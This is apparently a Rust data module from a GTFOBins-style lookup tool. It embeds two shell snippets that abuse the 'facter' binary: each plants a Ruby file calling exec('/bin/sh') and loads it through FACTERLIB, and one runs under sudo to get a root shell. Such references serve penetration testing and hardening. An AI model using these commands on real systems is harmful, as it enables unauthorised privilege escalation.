
pub static BIN_NAME: &'static str = "facter";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'exec("/bin/sh")' > $TF/x.rb
    FACTERLIB=$TF facter
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'exec("/bin/sh")' > $TF/x.rb
    sudo FACTERLIB=$TF facter
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
